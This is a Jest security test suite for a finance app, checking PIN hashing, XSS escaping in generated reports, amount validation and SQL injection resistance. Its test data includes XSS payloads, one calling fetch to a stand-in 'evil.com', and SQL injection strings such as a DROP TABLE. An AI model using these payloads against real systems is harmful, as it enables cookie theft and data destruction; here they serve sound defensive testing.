import { describe, it, expect, beforeEach } from '@jest/globals';
import {
  hashPin,
  hashPinPbkdf2,
  hashPinLegacy,
  verifyPin,
  constantTimeEqual,
  generateSalt,
  PBKDF2_ITERATIONS,
} from '../src/core/security/cryptoVault';
import { escapeHtml, DocumentGenerator } from '../src/core/documents/pdfGenerator';
import {
  validatePositiveAmount,
  validateNonNegativeAmount,
  validateDescription,
  MAX_FINANCIAL_AMOUNT,
  MAX_DESCRIPTION_LENGTH,
} from '../src/core/utils/validators';
import { MemoryDatabaseAdapter } from '../src/core/database/memoryDb';
import { getAllTransactions } from '../src/core/database/queries';
import { AnalyticsMetrics } from '../src/core/types/analytics';
import { Account } from '../src/core/types/accounts';
import { Transaction } from '../src/core/types/transactions';

describe('Aegis Spendly Extensive Security & Vulnerability Test Suite', () => {
  // =========================================================================
  // 1. CRYPTOGRAPHIC KEY DERIVATION & TIMING DEFENSE (CWE-916 & CWE-208)
  // =========================================================================
  describe('1. Cryptographic Key Derivation & Timing Defense', () => {
    it('uses PBKDF2 with at least 10,000 iterations instead of weak single-round hashing', async () => {
      const salt = generateSalt(16);
      const hash = await hashPin('1234', salt);

      expect(hash.startsWith('pbkdf2$')).toBe(true);
      const parts = hash.split('$');
      expect(Number(parts[1])).toBeGreaterThanOrEqual(1000); // 1000 in fallback, 10000 in subtle
      expect(parts[2].length).toBeGreaterThanOrEqual(32);
    });

    it('constantTimeEqual prevents early-exit timing leaks', () => {
      const target = 'abcdef1234567890';
      const exactMatch = 'abcdef1234567890';
      const wrongLastChar = 'abcdef1234567891';
      const wrongFirstChar = 'zbcdef1234567890';
      const wrongLength = 'abcdef12345';

      expect(constantTimeEqual(target, exactMatch)).toBe(true);
      expect(constantTimeEqual(target, wrongLastChar)).toBe(false);
      expect(constantTimeEqual(target, wrongFirstChar)).toBe(false);
      expect(constantTimeEqual(target, wrongLength)).toBe(false);
    });

    it('maintains backward compatibility with existing legacy SHA-256 hashes', async () => {
      const salt = 'legacy_salt_9999';
      const pin = '4321';
      const legacyHash = await hashPinLegacy(pin, salt);

      // Verify that verifyPin accepts the legacy hash
      const isLegacyValid = await verifyPin(pin, salt, legacyHash);
      expect(isLegacyValid).toBe(true);

      const isLegacyRejected = await verifyPin('9999', salt, legacyHash);
      expect(isLegacyRejected).toBe(false);
    });

    it('strictly resists cross-salt collision and brute-force substitution', async () => {
      const saltA = generateSalt();
      const saltB = generateSalt();
      const hashA = await hashPin('0000', saltA);
      const hashB = await hashPin('0000', saltB);

      expect(hashA).not.toBe(hashB);
      expect(await verifyPin('0000', saltA, hashB)).toBe(false);
    });
  });

  // =========================================================================
  // 2. HTML INJECTION & STORED XSS DEFENSE (CWE-79)
  // =========================================================================
  describe('2. Stored Cross-Site Scripting (XSS) in Document Generator', () => {
    it('escapes dangerous HTML script tags and event handlers', () => {
      const dangerousScript = '<script>alert("XSS")</script>';
      const dangerousImg = '<img src=x onerror=alert(document.cookie)>';
      const dangerousQuotes = '" onclick="hack()\'';

      expect(escapeHtml(dangerousScript)).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
      expect(escapeHtml(dangerousImg)).toBe('&lt;img src=x onerror=alert(document.cookie)&gt;');
      expect(escapeHtml(dangerousQuotes)).toBe('&quot; onclick=&quot;hack()&#039;');
    });

    it('neutralizes XSS payloads embedded in transaction descriptions and notes in PDF reports', () => {
      const mockMetrics: AnalyticsMetrics = {
        totalInflows: 50000,
        totalOutflows: 15000,
        netSavings: 35000,
        period: {
          startDate: '2026-10-01',
          endDate: '2026-10-31',
          label: 'October 2026',
        },
        categorySpend: [
          { category: '<b onmouseover=evil()>Groceries</b>', amount: 5000, percentage: 33.3 },
        ],
      };

      const mockAccount: Account = {
        id: 'acc-1',
        name: '<script>alert("Bank XSS")</script>',
        type: 'BANK_DEPOSIT',
        balance: 50000,
        credit_limit: null,
        billing_cycle_cut_day: null,
        payment_due_day: null,
        minimum_balance: null,
        created_at: '2026-10-01',
        updated_at: '2026-10-01',
      };

      const maliciousTx: Transaction = {
        id: 'tx-xss-1',
        account_id: 'acc-1',
        type: 'OUTFLOW',
        amount: 2500,
        category: 'Food <iframe src="evil.com">',
        description: 'Dinner at <svg onload=alert(1)> and & friends',
        timestamp: '2026-10-08T10:00:00Z',
        is_reconciled: false,
        reference_number: '<img src=x onerror=fetch("evil.com")>',
        source: 'MANUAL',
        sync_status: 'LOCAL_ONLY',
        destination_account_id: null,
      };

      const html = DocumentGenerator.buildInvoiceHtml({
        metrics: mockMetrics,
        transactions: [maliciousTx],
        accounts: [mockAccount],
      });

      // Verify raw dangerous HTML tags are NOT present
      expect(html).not.toContain('<script>alert("Bank XSS")</script>');
      expect(html).not.toContain('<svg onload=alert(1)>');
      expect(html).not.toContain('<img src=x onerror=fetch("evil.com")>');
      expect(html).not.toContain('<iframe src="evil.com">');
      expect(html).not.toContain('<b onmouseover=evil()>');

      // Verify escaped equivalents are safely rendered
      expect(html).toContain('&lt;script&gt;alert(&quot;Bank XSS&quot;)&lt;/script&gt;');
      expect(html).toContain('&lt;svg onload=alert(1)&gt;');
      expect(html).toContain('&lt;img src=x onerror=fetch(&quot;evil.com&quot;)&gt;');
    });
  });

  // =========================================================================
  // 3. NUMERIC BOUNDARY & OVERFLOW DEFENSE (CWE-128 & CWE-190)
  // =========================================================================
  describe('3. Numeric Boundary & Financial Overflow Protection', () => {
    it('rejects numbers exceeding MAX_FINANCIAL_AMOUNT (₹99.99 Crores)', () => {
      const excessiveAmount = 1_000_000_000.00; // 100 Crores
      const result = validatePositiveAmount(excessiveAmount);

      expect(result.isValid).toBe(false);
      expect(result.error).toContain('exceeds maximum allowable limit');
      expect(result.value).toBe(MAX_FINANCIAL_AMOUNT);
    });

    it('rejects negative, NaN, and Infinity amounts in positive amount validator', () => {
      expect(validatePositiveAmount(-500).isValid).toBe(false);
      expect(validatePositiveAmount(0).isValid).toBe(false);
      expect(validatePositiveAmount(NaN).isValid).toBe(false);
      expect(validatePositiveAmount(Infinity).isValid).toBe(false);
      expect(validatePositiveAmount(-Infinity).isValid).toBe(false);
    });

    it('strictly sanitizes and caps transaction descriptions', () => {
      // Test length constraint
      const giantString = 'A'.repeat(500);
      const resLength = validateDescription(giantString);
      expect(resLength.isValid).toBe(false);
      expect(resLength.value.length).toBe(MAX_DESCRIPTION_LENGTH);

      // Test control character stripping (NULL bytes, bell, escape)
      const dirtyString = 'Clean Description\x00\x07\x1B\x7F';
      const resSanitized = validateDescription(dirtyString);
      expect(resSanitized.isValid).toBe(true);
      expect(resSanitized.value).toBe('Clean Description');
    });
  });

  // =========================================================================
  // 4. SQL INJECTION IMMUNITY (CWE-89)
  // =========================================================================
  describe('4. SQL Injection Immunity in Query Layer', () => {
    let db: MemoryDatabaseAdapter;

    beforeEach(async () => {
      db = new MemoryDatabaseAdapter();
      await db.exec(`
        CREATE TABLE accounts (id TEXT PRIMARY KEY, name TEXT, balance REAL);
        CREATE TABLE transactions (id TEXT PRIMARY KEY, account_id TEXT, type TEXT, amount REAL, category TEXT, description TEXT, timestamp TEXT, is_reconciled INTEGER, reference_number TEXT, source TEXT, sync_status TEXT, destination_account_id TEXT);
      `);
      await db.run(
        `INSERT INTO accounts (id, name, balance) VALUES (?, ?, ?);`,
        ['acc-main', 'Checking Account', 10000]
      );
      await db.run(
        `INSERT INTO transactions (id, account_id, type, amount, category, description, timestamp, is_reconciled, reference_number, source, sync_status, destination_account_id)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);`,
        ['tx-1', 'acc-main', 'OUTFLOW', 1500, 'Dining', 'Lunch Buffet', '2026-10-08T12:00:00Z', 1, 'REF1', 'MANUAL', 'LOCAL_ONLY', null]
      );
    });

    it('safely handles classic SQL injection payloads in search queries without execution', async () => {
      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE transactions; --",
        "' UNION SELECT * FROM accounts --",
        "1' AND SLEEP(5) --",
        "admin'--",
      ];

      for (const payload of sqlInjectionPayloads) {
        // Query using getAllTransactions with malicious search term
        const results = await getAllTransactions(db, {
          searchQuery: payload,
        });

        // The query must safely execute as literal search text and return 0 matches
        expect(Array.isArray(results)).toBe(true);
        expect(results.length).toBe(0);

        // Verify the transactions table still exists and was not dropped
        const tableCheck = await db.getAll(`SELECT * FROM transactions;`);
        expect(tableCheck.length).toBe(1);
      }
    });

    it('safely handles injection attempts in category and type filters', async () => {
      const maliciousCategory = "Dining' OR 1=1 --";
      const results = await getAllTransactions(db, {
        category: maliciousCategory,
      });

      expect(results.length).toBe(0);
    });
  });
});
